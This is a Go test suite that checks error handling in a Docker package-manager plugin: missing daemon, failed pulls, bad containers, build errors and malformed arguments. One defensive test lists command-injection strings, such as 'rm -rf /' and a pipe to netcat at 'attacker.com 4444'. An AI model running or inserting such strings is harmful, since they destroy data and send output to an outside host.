package main_test

import (
	"fmt"
	"os"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-docker"
	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
)

// Mock logger for Docker error handling tests
type MockDockerLogger struct {
	messages []string
	errors   []string
	warnings []string
	silent   bool
}

func (m *MockDockerLogger) Printf(format string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf(format, args...))
	}
}

func (m *MockDockerLogger) Println(msg string, args ...any) {
	if !m.silent {
		if len(args) > 0 {
			m.messages = append(m.messages, fmt.Sprintf(msg, args...))
		} else {
			m.messages = append(m.messages, msg)
		}
	}
}

func (m *MockDockerLogger) Success(msg string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf("SUCCESS: "+msg, args...))
	}
}

func (m *MockDockerLogger) Warning(msg string, args ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, fmt.Sprintf(msg, args...))
	}
}

func (m *MockDockerLogger) ErrorMsg(msg string, args ...any) {
	if !m.silent {
		m.errors = append(m.errors, fmt.Sprintf(msg, args...))
	}
}

func (m *MockDockerLogger) Info(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "INFO: "+msg)
	}
}

func (m *MockDockerLogger) Warn(msg string, keyvals ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, "WARN: "+msg)
	}
}

func (m *MockDockerLogger) Error(msg string, err error, keyvals ...any) {
	if !m.silent {
		if err != nil {
			m.errors = append(m.errors, fmt.Sprintf("ERROR: %s - %v", msg, err))
		} else {
			m.errors = append(m.errors, "ERROR: "+msg)
		}
	}
}

func (m *MockDockerLogger) Debug(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "DEBUG: "+msg)
	}
}

func (m *MockDockerLogger) HasError(substring string) bool {
	for _, err := range m.errors {
		if strings.Contains(err, substring) {
			return true
		}
	}
	return false
}

func (m *MockDockerLogger) HasWarning(substring string) bool {
	for _, warning := range m.warnings {
		if strings.Contains(warning, substring) {
			return true
		}
	}
	return false
}

func (m *MockDockerLogger) Clear() {
	m.messages = nil
	m.errors = nil
	m.warnings = nil
}

var _ = Describe("Docker Plugin Error Handling", func() {
	var (
		plugin       *main.DockerInstaller
		mockLogger   *MockDockerLogger
		originalPath string
	)

	BeforeEach(func() {
		// Save original PATH for restoration
		originalPath = os.Getenv("PATH")

		// Create plugin with mock logger
		info := sdk.PluginInfo{
			Name:        "package-manager-docker",
			Version:     "test",
			Description: "Test Docker plugin for error handling",
		}

		plugin = &main.DockerInstaller{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "docker"),
		}

		mockLogger = &MockDockerLogger{}
		plugin.SetLogger(mockLogger)
	})

	AfterEach(func() {
		// Restore original PATH
		_ = os.Setenv("PATH", originalPath)
		mockLogger.Clear()
	})

	Describe("Docker Daemon Availability", func() {
		Context("when Docker is not installed", func() {
			It("should handle missing Docker gracefully", func() {
				// Temporarily modify PATH to simulate missing docker
				_ = os.Setenv("PATH", "/tmp")

				err := plugin.Execute("status", []string{})

				if err != nil {
					Expect(err.Error()).To(ContainSubstring("docker is not installed"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
					Expect(mockLogger.HasError("Docker is not installed")).To(BeTrue())
				}
			})

			It("should provide actionable error when Docker command not found", func() {
				// Test with non-existent docker command
				_ = os.Setenv("PATH", "/nonexistent")

				err := plugin.Execute("status", []string{})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("docker is not installed"),
						ContainSubstring("not found"),
					))
					Expect(err.Error()).To(Not(BeEmpty()))
				}
			})
		})

		Context("when Docker daemon is not running", func() {
			It("should detect and report daemon status correctly", func() {
				// This test would need Docker installed but daemon stopped
				// For unit testing, we verify the error handling structure

				err := plugin.Execute("status", []string{})

				if err != nil && strings.Contains(err.Error(), "daemon is not running") {
					Expect(err.Error()).To(ContainSubstring("daemon is not running"))
					Expect(mockLogger.HasError("Docker daemon is not running")).To(BeTrue())
				}
			})
		})
	})

	Describe("Network Failure Scenarios", func() {
		Context("when pulling images fails due to network issues", func() {
			It("should handle image pull failures gracefully", func() {
				err := plugin.Execute("pull", []string{"nonexistent-registry.com/invalid-image:latest"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("pull"),
						ContainSubstring("failed"),
						ContainSubstring("network"),
					))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should provide helpful messages for registry connection failures", func() {
				err := plugin.Execute("pull", []string{"invalid-registry-url.example/test:latest"})

				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).To(Not(ContainSubstring("unknown error")))
					Expect(errorMsg).To(Not(ContainSubstring("nil pointer")))
				}
			})
		})

		Context("when pushing images fails", func() {
			It("should handle push failures with authentication errors", func() {
				err := plugin.Execute("push", []string{"unauthorized-registry.com/test:latest"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
					Expect(err.Error()).To(Not(BeEmpty()))
				}
			})
		})
	})

	Describe("Container Management Errors", func() {
		Context("when container operations fail", func() {
			It("should handle container start failures gracefully", func() {
				err := plugin.Execute("start", []string{"non-existent-container-12345"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("container"),
						ContainSubstring("not found"),
						ContainSubstring("start"),
					))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should handle container stop failures for non-running containers", func() {
				err := plugin.Execute("stop", []string{"non-existent-container"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("runtime error")))
				}
			})

			It("should handle container restart failures", func() {
				err := plugin.Execute("restart", []string{"invalid-container"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when container execution fails", func() {
			It("should handle exec failures on non-existent containers", func() {
				err := plugin.Execute("exec", []string{"non-existent-container", "echo", "test"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("container"),
						ContainSubstring("exec"),
					))
				}
			})

			It("should handle exec failures with invalid commands", func() {
				err := plugin.Execute("exec", []string{"test-container", "invalid-command-xyz"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Image Management Errors", func() {
		Context("when image operations fail", func() {
			It("should handle image removal failures for non-existent images", func() {
				err := plugin.Execute("rmi", []string{"non-existent-image:latest"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("image"),
						ContainSubstring("not found"),
					))
				}
			})

			It("should handle image removal failures when containers are using the image", func() {
				err := plugin.Execute("rmi", []string{"ubuntu:latest"})

				if err != nil && strings.Contains(err.Error(), "container is using") {
					Expect(err.Error()).To(ContainSubstring("container"))
				}
			})
		})

		Context("when listing images fails", func() {
			It("should handle Docker daemon communication failures", func() {
				err := plugin.Execute("images", []string{})

				// Should not crash even if daemon is unavailable
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Docker Compose Errors", func() {
		Context("when compose file is missing or invalid", func() {
			It("should handle missing docker-compose.yml gracefully", func() {
				err := plugin.Execute("compose", []string{"up", "-d"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("compose"),
						ContainSubstring("file"),
						ContainSubstring("not found"),
					))
				}
			})

			It("should handle invalid compose file syntax", func() {
				// Test with compose operations that might fail due to syntax
				err := plugin.Execute("compose", []string{"config"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when compose services fail to start", func() {
			It("should handle service startup failures", func() {
				err := plugin.Execute("compose", []string{"up"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("runtime error")))
				}
			})
		})
	})

	Describe("Build Failures", func() {
		Context("when Dockerfile is missing or invalid", func() {
			It("should handle missing Dockerfile", func() {
				err := plugin.Execute("build", []string{"-t", "test-image", "."})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("Dockerfile"),
						ContainSubstring("build"),
						ContainSubstring("not found"),
					))
				}
			})

			It("should handle invalid Dockerfile syntax", func() {
				err := plugin.Execute("build", []string{"-t", "test-image", "/nonexistent"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when build context is invalid", func() {
			It("should handle invalid build context paths", func() {
				err := plugin.Execute("build", []string{"-t", "test", "/invalid/path"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("nil pointer")))
				}
			})
		})
	})

	Describe("Resource Exhaustion Scenarios", func() {
		Context("when system resources are limited", func() {
			It("should handle out of disk space errors", func() {
				// Test large image operations
				err := plugin.Execute("pull", []string{"ubuntu:latest"})

				if err != nil && strings.Contains(err.Error(), "no space left") {
					Expect(err.Error()).To(ContainSubstring("space"))
				}
			})

			It("should handle memory exhaustion during builds", func() {
				err := plugin.Execute("build", []string{"-t", "memory-test", "."})

				if err != nil && strings.Contains(err.Error(), "memory") {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when Docker daemon is overloaded", func() {
			It("should handle daemon timeout errors", func() {
				// Simulate operations that might timeout
				err := plugin.Execute("images", []string{})

				if err != nil && strings.Contains(err.Error(), "timeout") {
					Expect(err.Error()).To(ContainSubstring("timeout"))
				}
			})
		})
	})

	Describe("Permission and Security Errors", func() {
		Context("when user lacks Docker permissions", func() {
			It("should handle permission denied errors", func() {
				// Skip if running as root or in Docker group
				if os.Getuid() == 0 {
					Skip("Running as root - cannot test permission errors")
				}

				err := plugin.Execute("images", []string{})

				if err != nil && strings.Contains(err.Error(), "permission denied") {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("permission"),
						ContainSubstring("docker group"),
						ContainSubstring("sudo"),
					))
				}
			})
		})

		Context("when Docker socket is inaccessible", func() {
			It("should handle socket connection failures", func() {
				err := plugin.Execute("status", []string{})

				if err != nil && strings.Contains(err.Error(), "socket") {
					Expect(err.Error()).To(ContainSubstring("socket"))
				}
			})
		})
	})

	Describe("Invalid Input Handling", func() {
		Context("when provided with malformed arguments", func() {
			It("should reject dangerous command injections", func() {
				dangerousCommands := []string{
					"test-image; rm -rf /",
					"image && malicious-command",
					"container | nc attacker.com 4444",
					"$(rm -rf /)",
					"`malicious-command`",
				}

				for _, cmd := range dangerousCommands {
					err := plugin.Execute("pull", []string{cmd})
					if err != nil {
						// Should fail, but not due to command injection
						Expect(err.Error()).To(Not(ContainSubstring("command not found")))
					}
				}
			})

			It("should handle empty and whitespace arguments", func() {
				invalidArgs := []string{"", " ", "\t", "\n"}

				for _, arg := range invalidArgs {
					err := plugin.Execute("pull", []string{arg})
					if err != nil {
						Expect(err.Error()).To(Not(BeEmpty()))
					}
				}
			})
		})

		Context("when no arguments are provided to commands requiring them", func() {
			It("should provide clear error messages", func() {
				commandsRequiringArgs := []string{"pull", "push", "start", "stop", "restart", "rmi"}

				for _, command := range commandsRequiringArgs {
					err := plugin.Execute(command, []string{})
					if err != nil {
						Expect(err.Error()).To(Not(BeEmpty()))
						Expect(err.Error()).To(Not(ContainSubstring("panic")))
					}
				}
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("error messages should be actionable", func() {
			It("should provide specific guidance for common Docker errors", func() {
				err := plugin.Execute("pull", []string{"nonexistent:latest"})

				if err != nil {
					errorMsg := err.Error()

					// Should not contain low-level technical details
					Expect(errorMsg).To(Not(ContainSubstring("goroutine")))
					Expect(errorMsg).To(Not(ContainSubstring("stack trace")))
					Expect(errorMsg).To(Not(ContainSubstring("nil pointer")))

					// Should be informative
					Expect(len(errorMsg)).To(BeNumerically(">", 5))
				}
			})

			It("should include container/image names in error messages", func() {
				containerName := "test-container-12345"
				err := plugin.Execute("start", []string{containerName})

				if err != nil {
					errorMsg := err.Error()
					// Should include context about what failed
					Expect(errorMsg).To(Not(Equal("error")))
					Expect(errorMsg).To(Not(Equal("failed")))
				}
			})
		})
	})

	Describe("Unknown Command Handling", func() {
		Context("when executing unknown commands", func() {
			It("should return helpful error for unknown commands", func() {
				err := plugin.Execute("invalid-docker-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
				Expect(err.Error()).To(ContainSubstring("invalid-docker-command"))
			})
		})
	})

	Describe("Docker Installation Status", func() {
		Context("when checking installation status", func() {
			It("should handle ensure-installed command gracefully", func() {
				err := plugin.Execute("ensure-installed", []string{})

				// Should not panic regardless of Docker installation status
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})
})

// Performance and stress testing for Docker error conditions
var _ = Describe("Docker Plugin Stress Testing", func() {
	var plugin *main.DockerInstaller

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "package-manager-docker",
			Version:     "test",
			Description: "Stress test Docker plugin",
		}

		plugin = &main.DockerInstaller{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "docker"),
		}

		mockLogger := &MockDockerLogger{silent: true} // Silent for performance tests
		plugin.SetLogger(mockLogger)
	})

	Context("handling many concurrent operations", func() {
		It("should not deadlock with concurrent Docker commands", func() {
			done := make(chan bool, 5)

			// Launch concurrent Docker operations
			operations := []string{"images", "list", "status"}

			for _, op := range operations {
				go func(operation string) {
					defer GinkgoRecover()
					err := plugin.Execute(operation, []string{})
					// Errors are expected in test environment
					_ = err
					done <- true
				}(op)
			}

			// Wait for all operations to complete
			for range operations {
				Eventually(done).Should(Receive())
			}
		})
	})

	Context("handling rapid repeated operations", func() {
		It("should handle rapid Docker status checks without leaks", func() {
			for i := 0; i < 50; i++ {
				err := plugin.Execute("status", []string{})
				// Errors are acceptable, testing for stability
				_ = err
			}
		})
	})

	Context("handling large argument lists", func() {
		It("should handle operations with many arguments", func() {
			// Test with many container names (simulating batch operations)
			var containers []string
			for i := 0; i < 50; i++ {
				containers = append(containers, fmt.Sprintf("container-%d", i))
			}

			err := plugin.Execute("list", containers)
			if err != nil {
				Expect(err.Error()).To(Not(ContainSubstring("panic")))
			}
		})
	})
})
